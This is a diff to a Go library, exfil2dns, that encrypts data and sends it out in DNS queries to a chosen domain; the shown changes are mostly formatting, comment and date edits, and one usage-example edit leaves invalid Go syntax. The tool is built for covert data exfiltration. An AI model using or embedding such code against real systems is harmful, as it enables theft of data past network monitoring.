@@ -30,10 +30,11 @@
 //
 //	func main() {
 //		client, err := exfil2dns.NewClient(
-//			"cube", 
-//			"example.domain", 
-//			"ThisIsAKey1234", 23)
-//		
+//			"cube",
+//			"example.domain",
+//			"ThisIsAKey1234", 23
+//		)
+//
 //		if err != nil {
 //			log.Fatal("Error creating client: " + err.Error())
 //		}
@@ -47,7 +48,7 @@
 package exfil2dns
 
 /*
- * exfil2dns.go by Carson Seese. Created: 09/23/2019. Modified: 09/24/2019.
+ * exfil2dns.go by Carson Seese. Created: 09/23/2019. Modified: 10/05/2019.
  * Data exfiltration using DNS queries.
  */
 
@@ -76,18 +77,17 @@ var (
 	MaxQueryLength = 63
 )
 
-
 // Client contains the parameters to required to encrypt and deliver the
 // payload. Use NewClient() to initialize.
 type Client struct {
 	target, domain, server, format string
-	key                    [32]byte
-	chunkSize              int
+	key                            [32]byte
+	chunkSize                      int
 }
 
 // NewClient initializes the Client
 // Target is the name of the target system. Domain is the domain to append to
-// the query string. Chunk size is the max number of payload bytes per message, 
+// the query string. Chunk size is the max number of payload bytes per message,
 // must be <= 23.
 func NewClient(target, domain, password string, chunkSize int) (Client, error) {
 	return NewDevClient(target, domain, password, "", chunkSize)
@@ -99,7 +99,7 @@ func NewDevClient(target, domain, password, server string, chunkSize int) (Clien
 	if chunkSize > 23 {
 		return Client{},
 			fmt.Errorf(
-				"chunk size %v larger than max chunk size of %v", 
+				"chunk size %v larger than max chunk size of %v",
 				chunkSize, MaxChunk,
 			)
 	}
@@ -107,7 +107,7 @@ func NewDevClient(target, domain, password, server string, chunkSize int) (Clien
 	encodedT := b32.EncodeToString([]byte(target))
 	if len(encodedT) > MaxQueryLength {
 		return Client{}, fmt.Errorf(
-			"target name %v longer than max length of %d", 
+			"target name %v longer than max length of %d",
 			target, MaxQueryLength,
 		)
 	}
@@ -184,7 +184,8 @@ func (c *Client) Exfil(payload []byte) error {
 	return nil
 }
 
-// Encode takes a chunk of data, encrypts it, and returns a query
+// Encode takes a chunk of data, encrypts it, and returns a query. Chunks must
+// be < MaxChunk.
 func (c *Client) Encode(chunk []byte) (string, error) {
 	if len(chunk) > c.chunkSize {
 		return "", fmt.Errorf(
